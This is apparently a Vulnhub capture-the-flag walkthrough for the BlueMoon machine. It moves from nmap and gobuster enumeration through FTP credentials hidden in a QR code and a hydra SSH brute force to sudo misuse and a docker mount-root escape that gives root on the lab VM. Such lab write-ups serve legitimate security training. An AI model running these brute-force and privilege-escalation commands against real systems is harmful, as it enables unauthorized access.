# BlueMoon: Vulnhub Walkthrough

## Scanning

Let's start with scanning
**nmap 192.168.122.140**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled.png)

**nmap -sV -A 192.168.122.140** (Service version scan)

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%201.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%201.png)

## Enumeration

Open port 80 in browser http://192.168.122.140/

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%202.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%202.png)

Lets find out directories using gobuster

**gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.122.140/**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%203.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%203.png)

**Found directory hidden_text

Opening it in browser **http://192.168.122.140/hidden_text**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%204.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%204.png)

When clicking on thank you it redirects to QR code.

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%205.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%205.png)

Decoding QR to text

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%206.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%206.png)

**Found ftp port user and password

Now connecting to ftp using **userftp:ftpp@ssword**

**ftp 192.168.122.140**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%207.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%207.png)

**ls**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%208.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%208.png)

**Found two files information.txt and p_lists.txt

Downloading both file

**get information.txt (Download file to attacker machine)**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%209.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%209.png)

**cat information.txt (Reading file in attacker machine)**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2010.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2010.png)

**It giving hint about password list and user is robin

**get p_lists.txt** 

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2011.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2011.png)

**cat p_lists.txt (List of password)**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2012.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2012.png)

## Exploitation

Bruteforcing ssh using password list which we found earlier.

**hydra -l robin -P p_lists.txt 192.168.122.140 ssh**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2013.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2013.png)

Found password for user robin

**ssh robin@192.168.122.140**

**id**

**uname -a**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2014.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2014.png)

**cat /etc/passwd**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2015.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2015.png)

Found one more user jerry

**ls -al**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2016.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2016.png)

Found flag user1.txt

**cat user1.txt**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2017.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2017.png)

## Privilege escalation

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2018.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2018.png)

robin user can run file [feedback.sh](http://feedback.sh) with priviliege of user jerry

**sudo -u jerry /home/robin/project/feedback.sh**

**bash**

**id**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2019.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2019.png)

Got shell for jerry user

**python -c "import pty;pty.spawn('/bin/bash');"**

**cd /home/jerry**

**ls -al**

Found flag2 user2.txt

**cat user2.txt**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2020.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2020.png)

**id**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2021.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2021.png)

Privilege escalation using docker

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2022.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2022.png)

**docker run -v /:/mnt --rm -it alpine chroot /mnt sh**

Got shell for root user

**id**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2023.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2023.png)

**cd /root**

**ls -al**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2024.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2024.png)

**cat root.txt**

![Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2025.png](Bluemoon%20Vulnhub%20Walkthrough%2010e2007117b147f6a70f1b9f90d26bf6/Untitled%2025.png)
